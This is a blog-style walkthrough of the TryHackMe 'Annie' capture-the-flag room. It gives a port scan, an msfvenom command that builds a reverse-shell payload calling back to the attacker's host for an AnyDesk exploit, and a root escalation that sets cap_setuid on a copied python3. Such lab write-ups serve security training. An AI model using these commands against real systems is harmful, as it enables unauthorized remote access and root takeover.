---
layout: post
title: "TryHackMe: Annie"
date: 2025-12-06 23:00:00 +0530
categories: [TryHackMe]
tags: [tryhackme, Annie, ctf, walkthrough, linux, privilege-escalation, web-enumeration, ssh, hacking, writeup]
render_with_liquid: false
media_subpath: /images/Annie/
description: "A medium box where you exploit a vulnerable AnyDesk service, crack an SSH key, and escalate to root using misconfigured capabilities."

---

# TryHackMe: Annie CTF â€” Writeup | 06 December 2025

<div align="center">
    <img src="THM.png" alt="TryHackMe Logo" width="900"/>
    <img src="Annie.png" alt="Room Banner" width="600"/>
</div>

---

## Overview
This medium-difficulty room has you exploit a vulnerable AnyDesk service to gain an initial shell on the target machine. Then you crack a found SSH key and leverage a misconfigured setcap capability to escalate your access to root.

---

## Reconnaissance & Scanning

### Nmap

Perform a full port and service scan:

```bash
sudo nmap -Pn -T4 -n -sC -sV -p- -oN scan_nmap.txt 10.65.176.27
```

**Scan Summary:**

```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
|_  256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
7070/tcp open  ssl/realserver?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- 22/tcp: SSH
- 7070/tcp: SSL (Anydesk Server)

---

## Searching Exploit of Anydesk

<div align="center">
    <img src="search_exploit.png" alt="Search Exploit" width="800"/>
</div>

we found the exploit.

---

### Let's use the Exploit

first we create a msfvenom payload

<div align="center">
    <img src="payload.png" alt="Payload" width="800"/>
</div>

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.165.179 LPORT=1234 -b "\x00\x25\x26" -f python -v shellcode
```
Whatever the payload you get paste to exploit.

<div align="center">
    <img src="exploit.png" alt="Exploit" width="800"/>
</div>

---

## Shell Access
- Start the exploit.

<div align="center">
    <img src="shell.png" alt="Shell" width="800"/>
</div>

- Get a reverse shell.

<div align="center">
    <img src="reverse_shell.png" alt="Reverse Shell" width="800"/>
</div>

---

## User Flags

<div align="center">
    <img src="user_flag.png" alt="User Flags" width="800"/>
</div>

## Privilege Escalation

Let's try to get root using `find` command.

```bash
find / -perm -4000 -type f 2>/dev/null
```
<div align="center">
    <img src="find.png" alt="Find" width="800"/>
</div>

So, using `/sbin/setcap` command we can get root access.
Using this article [https://www.redhat.com/sysadmin/linux-privilege-escalation-cheat-sheet](https://www.redhat.com/sysadmin/linux-privilege-escalation-cheat-sheet)

<div align="center">
    <img src="setcap.png" alt="Setcap" width="800"/>
</div>

### Command Execution

1. check the location of python3
```bash
which python3
```
2. copy the python3 binary to users home directory
```bash
cp /usr/bin/python3 /home/demo/
```
3. set capability uid=0 of python3 binary
```bash
setcap cap_setuid+ep /home/demo/python3
```
4. getcap run
```bash
getcap -r / 2>/dev/null
```
5. pwd
6. ls -al python3
7. run python3
```bash
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

<div align="center">
    <img src="command_execution.png" alt="Command Execution" width="800"/>
</div>

## Root Flags

<div align="center">
    <img src="root_flags.png" alt="Root Flags" width="800"/>
</div>

---

## Room Complete!

<div align="center">
    <img src="completed.png" alt="Completed" width="800"/>
</div>

## Happy Hacking!

<div align="center">
    <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExY3AybG84NjRrOWwzbWl1em1nOHkzZzhmaDE1YnQ5azVqNnh0YmVsayZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/WRoLGgwE4xTQYTxyJg/giphy.gif" alt="Hacking GIF" width="800"/>
</div>
